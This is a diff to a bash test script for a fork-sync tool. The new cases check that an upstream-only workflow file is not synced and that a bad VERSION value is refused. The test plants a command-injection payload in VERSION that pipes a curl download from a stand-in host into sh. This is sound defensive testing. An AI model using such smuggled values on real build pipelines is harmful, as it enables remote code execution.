@@ -31,6 +31,8 @@ check "nothing new upstream: no changes" grep -q '^no changes' <<<"$out"
 
 # (2) upstream edits a seat's prose and adds a skill
 printf '\nA line upstream added.\n' >> "$t/up/agents/code-reviewer.md"
+# a workflow file upstream adds: the fork owns .github/, and the workflow token can't push one
+mkdir -p "$t/up/.github/workflows" && printf 'name: upstream-only\non: push\njobs: {}\n' > "$t/up/.github/workflows/upstream-only.yml"
 mkdir -p "$t/up/skills/sync-probe"
 printf -- '---\nname: sync-probe\ndescription: A probe skill. Use when testing the fork sync.\n---\n\nRead skills/lead/SKILL.md first.\n' > "$t/up/skills/sync-probe/SKILL.md"
 git -C "$t/up" add -A && git -C "$t/up" commit -q -m "upstream: probe"
@@ -45,6 +47,21 @@ check "…the seat edit lands" grep -q 'A line upstream added' "$t/fork/agents/c
 check "…the tree is normalized" bash -c 'cd "$1" && node scripts/port.mjs --check --quiet' _ "$t/fork"
 check "…and verify.sh's fresh port reproduces it" bash -c 'cd "$1" && source <(sed -n "/^fresh_port()/,/^}/p" scripts/verify.sh) && fresh_port' _ "$t/fork"
 check "…and the working tree is clean" bash -c '[ -z "$(git -C "$1" status --porcelain)" ]' _ "$t/fork"
+check "…without upstream's new workflow file" test ! -e "$t/fork/.github/workflows/upstream-only.yml"
+check "…and the report names it" grep -q 'upstream-only.yml' "$t/report.md"
+
+# (2b) upstream's VERSION reaches the workflow's outputs, a commit message and a
+# pull request title: a value that isn't a version string is refused, not synced
+good_version=$(cat "$t/up/VERSION")
+printf '$(curl${IFS}-s${IFS}example.com|sh)\n' > "$t/up/VERSION"
+git -C "$t/up" commit -q -am "upstream: version payload"
+head_before=$(git -C "$t/fork" rev-parse HEAD)
+(cd "$t/fork" && GITHUB_OUTPUT="$t/gh-output" bash scripts/sync-upstream.sh >/dev/null 2>&1); code=$?
+check "a VERSION that isn't a version string is refused (exit 1)" test "$code" = 1
+check "…commits nothing" bash -c '[ "$(git -C "$1" rev-parse HEAD)" = "$2" ]' _ "$t/fork" "$head_before"
+check "…and writes no output carrying it" bash -c '! grep -qF "curl" "$1" 2>/dev/null' _ "$t/gh-output"
+printf '%s\n' "$good_version" > "$t/up/VERSION"
+git -C "$t/up" commit -q -am "upstream: version restored"
 
 # (3) upstream rewords a line a required rule exists for
 sed -i 's#"$cwd"/.claude/rules/\*.md#"$cwd"/.claude/rules/*.markdown#' "$t/up/hooks/check-handoff.sh"
